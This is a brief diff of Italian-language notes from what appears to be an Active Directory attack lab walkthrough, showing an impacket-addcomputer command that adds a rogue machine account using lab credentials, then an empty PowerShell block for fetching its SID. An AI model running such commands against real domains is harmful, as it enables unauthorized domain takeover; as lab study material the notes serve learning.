@@ -447,3 +447,8 @@ Quindi aggiungiamo un nuovo computer al domain
 impacket-addcomputer -computer-name 'krbrelay$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
 ```
 ![[Pasted image 20230906123509.png]]
+
+Ora prendiamo il SID del nuovo Computer
+```PowerShell
+
+```
